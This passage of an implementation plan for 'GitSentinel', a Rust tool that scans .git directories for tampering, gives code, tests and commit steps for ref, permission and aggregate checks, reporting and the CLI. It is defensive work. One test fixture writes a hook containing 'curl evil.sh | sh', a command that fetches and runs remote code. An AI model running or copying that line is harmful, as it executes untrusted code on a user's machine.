        let findings = check_refs(git_dir);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }
}
```

- [ ] **Step 2: Add `mod refs;` to `src/checks/mod.rs`**

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test --lib checks::refs::`
Expected: compile error, `cannot find function 'check_refs' in this scope`

- [ ] **Step 4: Implement `check_refs` in `src/checks/refs.rs`**

Add above the `#[cfg(test)]` block:

```rust
fn is_hex_sha(s: &str) -> bool {
    (s.len() == 40 || s.len() == 64)
        && s.chars().all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
}

fn is_valid_ref_content(content: &str) -> bool {
    let trimmed = content.trim();
    if let Some(target) = trimmed.strip_prefix("ref: ") {
        return target.starts_with("refs/");
    }
    is_hex_sha(trimmed)
}

pub fn check_refs(git_dir: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    for subdir in ["refs/heads", "refs/tags", "refs/remotes"] {
        let dir = git_dir.join(subdir);
        if !dir.exists() {
            continue;
        }
        for entry in WalkDir::new(&dir).into_iter().flatten() {
            if !entry.file_type().is_file() {
                continue;
            }
            check_ref_file(entry.path(), &mut findings);
        }
    }

    let packed_refs = git_dir.join("packed-refs");
    if packed_refs.exists() {
        check_packed_refs(&packed_refs, &mut findings);
    }

    findings
}

fn check_ref_file(path: &Path, findings: &mut Vec<Finding>) {
    let content = match std::fs::read_to_string(path) {
        Ok(c) => c,
        Err(_) => {
            findings.push(Finding::new(
                Severity::Critical,
                "refs",
                path.to_path_buf(),
                "ref file is not valid UTF-8 text".to_string(),
            ));
            return;
        }
    };

    if !is_valid_ref_content(&content) {
        findings.push(Finding::new(
            Severity::Critical,
            "refs",
            path.to_path_buf(),
            format!("ref file does not contain a valid SHA or symref: {:?}", content.trim()),
        ));
    }
}

fn check_packed_refs(path: &Path, findings: &mut Vec<Finding>) {
    let content = match std::fs::read_to_string(path) {
        Ok(c) => c,
        Err(_) => return,
    };

    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with('^') {
            continue;
        }
        let mut parts = line.splitn(2, char::is_whitespace);
        let sha = parts.next().unwrap_or("");
        let refname = parts.next().unwrap_or("").trim();

        if !is_hex_sha(sha) || !refname.starts_with("refs/") {
            findings.push(Finding::new(
                Severity::Critical,
                "refs",
                path.to_path_buf(),
                format!("packed-refs line does not match '<sha> refs/...': {:?}", line),
            ));
        }
    }
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test --lib checks::refs::`
Expected: all four tests `... ok`

- [ ] **Step 6: Commit**

```bash
git add src/checks/refs.rs src/checks/mod.rs
git commit -m "Add check_refs: validate ref file and packed-refs content"
```

---

### Task 9: `check_permissions`

**Files:**
- Create: `src/checks/permissions.rs`
- Modify: `src/checks/mod.rs`

**Interfaces:**
- Consumes: `crate::model::{Finding, Severity}`, `crate::util::is_executable`, `walkdir::WalkDir`.
- Produces: `pub fn check_permissions(git_dir: &Path) -> Vec<Finding>`. Called from `checks::run_all_checks` in Task 10. This is the sole check responsible for executable-bit violations outside `hooks/` (see Global Constraints).

- [ ] **Step 1: Write the failing tests in `src/checks/permissions.rs`**

```rust
use crate::model::{Finding, Severity};
use crate::util::is_executable;
use std::path::Path;
use walkdir::WalkDir;

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use tempfile::tempdir;

    fn make_executable(path: &std::path::Path) {
        fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[test]
    fn clean_git_dir_has_no_findings() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::write(git_dir.join("HEAD"), "ref: refs/heads/main\n").unwrap();

        let findings = check_permissions(git_dir);
        assert!(findings.is_empty(), "expected no findings, got {:?}", findings);
    }

    #[test]
    fn executable_file_outside_hooks_is_critical() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::create_dir_all(git_dir.join("objects/ab")).unwrap();
        let obj_path = git_dir.join("objects/ab").join("c".repeat(38));
        fs::write(&obj_path, b"fake content").unwrap();
        make_executable(&obj_path);

        let findings = check_permissions(git_dir);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn executable_file_inside_hooks_is_ignored() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::create_dir_all(git_dir.join("hooks")).unwrap();
        let hook_path = git_dir.join("hooks/pre-commit");
        fs::write(&hook_path, "#!/bin/sh\n").unwrap();
        make_executable(&hook_path);

        let findings = check_permissions(git_dir);
        assert!(findings.is_empty(), "expected no findings, got {:?}", findings);
    }
}
```

- [ ] **Step 2: Add `mod permissions;` to `src/checks/mod.rs`**

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test --lib checks::permissions::`
Expected: compile error, `cannot find function 'check_permissions' in this scope`

- [ ] **Step 4: Implement `check_permissions` in `src/checks/permissions.rs`**

Add above the `#[cfg(test)]` block:

```rust
pub fn check_permissions(git_dir: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    let hooks_dir = git_dir.join("hooks");

    for entry in WalkDir::new(git_dir).into_iter().flatten() {
        if !entry.file_type().is_file() {
            continue;
        }
        let path = entry.path();
        if path.starts_with(&hooks_dir) {
            continue;
        }
        if is_executable(path) {
            findings.push(Finding::new(
                Severity::Critical,
                "permissions",
                path.to_path_buf(),
                "file outside hooks/ has the executable bit set".to_string(),
            ));
        }
    }

    findings
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test --lib checks::permissions::`
Expected: all three tests `... ok`

- [ ] **Step 6: Commit**

```bash
git add src/checks/permissions.rs src/checks/mod.rs
git commit -m "Add check_permissions: flag executable files anywhere outside hooks/"
```

---

### Task 10: `checks::run_all_checks` aggregator

**Files:**
- Modify: `src/checks/mod.rs`

**Interfaces:**
- Consumes: all six `check_*` functions from Tasks 4-9, `crate::model::Finding`.
- Produces: `pub fn run_all_checks(git_dir: &Path) -> Vec<Finding>`. Called from `main.rs` in Task 12 and from `tests/integration_test.rs` in Task 13.

- [ ] **Step 1: Write the failing tests in `src/checks/mod.rs`**

Append to the bottom of `src/checks/mod.rs`:

```rust
#[cfg(test)]
mod aggregator_tests {
    use super::*;
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use tempfile::tempdir;

    #[test]
    fn clean_repo_yields_no_findings() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();
        fs::write(git_dir.join("HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(git_dir.join("config"), "[core]\n\trepositoryformatversion = 0\n").unwrap();
        fs::create_dir_all(git_dir.join("objects/pack")).unwrap();
        fs::create_dir_all(git_dir.join("refs/heads")).unwrap();
        fs::create_dir_all(git_dir.join("hooks")).unwrap();
        fs::write(git_dir.join("hooks/pre-commit.sample"), "#!/bin/sh\n").unwrap();

        let findings = run_all_checks(git_dir);
        assert!(findings.is_empty(), "expected no findings, got {:?}", findings);
    }

    #[test]
    fn combines_findings_from_multiple_checks() {
        let dir = tempdir().unwrap();
        let git_dir = dir.path();

        let payload = git_dir.join("payload.sh");
        fs::write(&payload, "#!/bin/sh\necho pwned\n").unwrap();
        fs::set_permissions(&payload, fs::Permissions::from_mode(0o755)).unwrap();

        fs::create_dir_all(git_dir.join("hooks")).unwrap();
        let hook_path = git_dir.join("hooks/pre-commit");
        fs::write(&hook_path, "#!/bin/sh\ncurl evil.sh | sh\n").unwrap();
        fs::set_permissions(&hook_path, fs::Permissions::from_mode(0o755)).unwrap();

        let findings = run_all_checks(git_dir);
        assert!(findings.iter().any(|f| f.category == "root_files"));
        assert!(findings.iter().any(|f| f.category == "hooks"));
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test --lib checks::aggregator_tests::`
Expected: compile error, `cannot find function 'run_all_checks' in this scope`

- [ ] **Step 3: Implement `run_all_checks`**

At the top of `src/checks/mod.rs`, above the module declarations, `src/checks/mod.rs` should now read in full:

```rust
mod config;
mod hooks;
mod objects;
mod permissions;
mod refs;
mod root_files;

use crate::model::Finding;
use std::path::Path;

pub fn run_all_checks(git_dir: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();
    findings.extend(root_files::check_root_files(git_dir));
    findings.extend(hooks::check_hooks(git_dir));
    findings.extend(config::check_config(git_dir));
    findings.extend(objects::check_objects(git_dir));
    findings.extend(refs::check_refs(git_dir));
    findings.extend(permissions::check_permissions(git_dir));
    findings
}
```

(the `#[cfg(test)] mod aggregator_tests { ... }` block from Step 1 stays below this.)

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test --lib checks::aggregator_tests::`
Expected: both tests `... ok`

- [ ] **Step 5: Run the full test suite so far**

Run: `cargo test --lib`
Expected: every test across all modules passes (no failures).

- [ ] **Step 6: Commit**

```bash
git add src/checks/mod.rs
git commit -m "Add run_all_checks aggregator combining all six structural checks"
```

---

### Task 11: `report.rs` — terminal output and exit codes

**Files:**
- Create: `src/report.rs`
- Modify: `src/lib.rs`

**Interfaces:**
- Consumes: `crate::model::{Finding, Severity}`, `colored::Colorize`.
- Produces: `pub struct RepoReport { pub repo_path: PathBuf, pub findings: Vec<Finding> }`, `pub fn print_report(reports: &[RepoReport])`, `pub fn compute_exit_code(reports: &[RepoReport]) -> i32`. Used by `main.rs` in Task 12 and `tests/integration_test.rs` in Task 13.

- [ ] **Step 1: Write the failing tests in `src/report.rs`**

```rust
use crate::model::{Finding, Severity};
use std::path::PathBuf;

pub struct RepoReport {
    pub repo_path: PathBuf,
    pub findings: Vec<Finding>,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn report_with(findings: Vec<Finding>) -> RepoReport {
        RepoReport { repo_path: PathBuf::from("."), findings }
    }

    #[test]
    fn exit_code_is_zero_when_clean() {
        let reports = vec![report_with(vec![])];
        assert_eq!(compute_exit_code(&reports), 0);
    }

    #[test]
    fn exit_code_is_one_when_only_warnings() {
        let reports = vec![report_with(vec![Finding::new(Severity::Warning, "test", ".", "warn")])];
        assert_eq!(compute_exit_code(&reports), 1);
    }

    #[test]
    fn exit_code_is_two_when_any_critical() {
        let reports = vec![
            report_with(vec![Finding::new(Severity::Warning, "test", ".", "warn")]),
            report_with(vec![Finding::new(Severity::Critical, "test", ".", "crit")]),
        ];
        assert_eq!(compute_exit_code(&reports), 2);
    }
}
```

- [ ] **Step 2: Add `pub mod report;` to `src/lib.rs`**

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test --lib report::`
Expected: compile error, `cannot find function 'compute_exit_code' in this scope`

- [ ] **Step 4: Implement `print_report` and `compute_exit_code` in `src/report.rs`**

Add above the `#[cfg(test)]` block (after the import line, add `use colored::Colorize;`):

```rust
use colored::Colorize;

pub fn print_report(reports: &[RepoReport]) {
    for report in reports {
        println!("\n[repo] {}  (.git)", report.repo_path.display());
        if report.findings.is_empty() {
            println!("  clean — no issues found");
            continue;
        }
        for finding in &report.findings {
            let label = match finding.severity {
                Severity::Critical => "CRITICAL".red().bold(),
                Severity::Warning => "WARNING".yellow().bold(),
                Severity::Info => "INFO".blue().bold(),
            };
            println!("  {:<9} {}   {}", label, finding.path.display(), finding.message);
        }
    }

    let total_repos = reports.len();
    let critical_count = count_severity(reports, Severity::Critical);
    let warning_count = count_severity(reports, Severity::Warning);
    let info_count = count_severity(reports, Severity::Info);

    println!(
        "\nSummary: {} repos scanned, {} CRITICAL, {} WARNING, {} INFO",
        total_repos, critical_count, warning_count, info_count
    );
}

fn count_severity(reports: &[RepoReport], severity: Severity) -> usize {
    reports
        .iter()
        .flat_map(|r| r.findings.iter())
        .filter(|f| f.severity == severity)
        .count()
}

pub fn compute_exit_code(reports: &[RepoReport]) -> i32 {
    let has_critical = reports
        .iter()
        .any(|r| r.findings.iter().any(|f| f.severity == Severity::Critical));
    let has_warning = reports
        .iter()
        .any(|r| r.findings.iter().any(|f| f.severity == Severity::Warning));

    if has_critical {
        2
    } else if has_warning {
        1
    } else {
        0
    }
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test --lib report::`
Expected: all three tests `... ok`

- [ ] **Step 6: Commit**

```bash
git add src/report.rs src/lib.rs
git commit -m "Add colored terminal report and severity-based exit codes"
```

---

### Task 12: CLI and `main.rs` wiring

**Files:**
- Create: `src/cli.rs`
- Modify: `src/lib.rs`
- Modify: `src/main.rs`

**Interfaces:**
- Consumes: `git_sentinel::discovery::{discover_git_dirs, RepoEntry}`, `git_sentinel::checks::run_all_checks`, `git_sentinel::report::{print_report, compute_exit_code, RepoReport}`, `git_sentinel::model::{Finding, Severity}`.
- Produces: `pub struct Cli { pub path: PathBuf }` with `#[derive(Parser)]`. This is the last task before the integration tests in Task 13 — after this task the binary is fully functional end-to-end.

- [ ] **Step 1: Write the failing tests in `src/cli.rs`**

```rust
use clap::Parser;
use std::path::PathBuf;

#[derive(Parser, Debug)]
#[command(name = "gitsentinel", about = "Scan .git directories for structural anomalies")]
pub struct Cli {
    #[arg(default_value = ".")]
    pub path: PathBuf,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn defaults_to_current_dir() {
        let cli = Cli::parse_from(["gitsentinel"]);
        assert_eq!(cli.path, PathBuf::from("."));
    }

    #[test]
    fn accepts_explicit_path() {
        let cli = Cli::parse_from(["gitsentinel", "/tmp/some-repo"]);
        assert_eq!(cli.path, PathBuf::from("/tmp/some-repo"));
    }
}
```

- [ ] **Step 2: Add `pub mod cli;` to `src/lib.rs`**

- [ ] **Step 3: Run test to verify it passes**

Run: `cargo test --lib cli::`
Expected: both tests `... ok` (the struct and derive are defined in the same step as the tests here since `clap::Parser` provides the parsing logic — there is no separate "implementation" step to fail first).

- [ ] **Step 4: Replace `src/main.rs`**

```rust
use clap::Parser;
use git_sentinel::checks::run_all_checks;
use git_sentinel::cli::Cli;
use git_sentinel::discovery::{discover_git_dirs, RepoEntry};
use git_sentinel::model::{Finding, Severity};
use git_sentinel::report::{compute_exit_code, print_report, RepoReport};

fn main() {
    let cli = Cli::parse();
    println!("GitSentinel — scanning {}", cli.path.display());

    let entries = discover_git_dirs(&cli.path);
    let mut reports = Vec::new();

    for entry in entries {
        match entry {
            RepoEntry::GitDir(path) => {
                let findings = run_all_checks(&path);
                reports.push(RepoReport { repo_path: path, findings });
            }
            RepoEntry::GitLink(path) => {
                let findings = vec![Finding::new(
                    Severity::Info,
                    "discovery",
                    path.clone(),
                    "submodule/worktree pointer (.git file), not scanned as a separate repo".to_string(),
                )];
                reports.push(RepoReport { repo_path: path, findings });
            }
        }
    }

    print_report(&reports);
    std::process::exit(compute_exit_code(&reports));
}
```

- [ ] **Step 5: Build the binary**

Run: `cargo build`
Expected: `Compiling git-sentinel v0.1.0 (...)` then `Finished` with no errors.

- [ ] **Step 6: Manual smoke test against a real repo**

Run:
```bash
mkdir -p /tmp/gitsentinel-smoke-clean && cd /tmp/gitsentinel-smoke-clean && git init -q && cd -
./target/debug/gitsentinel /tmp/gitsentinel-smoke-clean
echo "exit code: $?"
```
Expected: output includes `clean — no issues found` and `exit code: 0`.

- [ ] **Step 7: Manual smoke test against a tampered repo**

Run:
```bash
touch /tmp/gitsentinel-smoke-clean/.git/payload.sh
chmod +x /tmp/gitsentinel-smoke-clean/.git/payload.sh
./target/debug/gitsentinel /tmp/gitsentinel-smoke-clean
echo "exit code: $?"
rm -rf /tmp/gitsentinel-smoke-clean
```
Expected: output includes at least one `CRITICAL` line mentioning `payload.sh`, and `exit code: 2`.

- [ ] **Step 8: Commit**

```bash
git add src/cli.rs src/lib.rs src/main.rs
git commit -m "Wire CLI, discovery, checks and report together into a working binary"
```

---

### Task 13: Integration tests

**Files:**
- Create: `tests/integration_test.rs`

**Interfaces:**
- Consumes: `git_sentinel::discovery::{discover_git_dirs, RepoEntry}`, `git_sentinel::checks::run_all_checks`, `git_sentinel::report::{compute_exit_code, RepoReport}`, `git_sentinel::model::Severity`.
- Produces: nothing consumed by later tasks — this is the terminal task in the plan.

This task assumes a `git` binary is available on `PATH` (the machine running these tests is expected to have git installed, since the tool's entire purpose is scanning git repositories).

- [ ] **Step 1: Write the integration tests**

```rust
use git_sentinel::checks::run_all_checks;
use git_sentinel::discovery::{discover_git_dirs, RepoEntry};
use git_sentinel::model::Severity;
use git_sentinel::report::{compute_exit_code, RepoReport};
use std::process::Command;
use tempfile::tempdir;

#[test]
fn real_git_init_repo_has_no_findings() {
    let dir = tempdir().unwrap();
    let status = Command::new("git")
        .arg("init")
        .arg("-q")
        .arg(dir.path())
        .status()
        .expect("git must be installed to run this test");
    assert!(status.success());

    let entries = discover_git_dirs(dir.path());
    assert_eq!(entries.len(), 1);

    let git_dir = match &entries[0] {
        RepoEntry::GitDir(path) => path.clone(),
        other => panic!("expected a GitDir entry, got {:?}", other),
    };

    let findings = run_all_checks(&git_dir);
    assert!(
        findings.is_empty(),
        "expected no findings on a clean git init, got {:?}",
        findings
    );
}

#[test]
fn tampered_repo_reports_critical_and_correct_exit_code() {
    let dir = tempdir().unwrap();
    let status = Command::new("git")
        .arg("init")
        .arg("-q")
        .arg(dir.path())
        .status()
        .expect("git must be installed to run this test");
    assert!(status.success());

    let git_dir = dir.path().join(".git");
    let payload = git_dir.join("payload.sh");
    std::fs::write(&payload, "#!/bin/sh\necho pwned\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&payload, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let findings = run_all_checks(&git_dir);
    assert!(findings.iter().any(|f| f.severity == Severity::Critical));

    let reports = vec![RepoReport { repo_path: git_dir, findings }];
    assert_eq!(compute_exit_code(&reports), 2);
}
```

- [ ] **Step 2: Run the integration tests**

Run: `cargo test --test integration_test`
Expected: `test real_git_init_repo_has_no_findings ... ok` and `test tampered_repo_reports_critical_and_correct_exit_code ... ok`

- [ ] **Step 3: Run the entire test suite**

Run: `cargo test`
Expected: every unit test (across `src/`) and both integration tests pass; zero failures.

- [ ] **Step 4: Commit**

```bash
git add tests/integration_test.rs
git commit -m "Add integration tests against a real git init and a tampered repo"
```

---

## Post-plan manual cleanup

`/tmp/gitsentinel-smoke-clean` from Task 12 is removed by its own step. No other manual cleanup is required — all other fixtures use `tempfile::tempdir()`, which self-deletes.
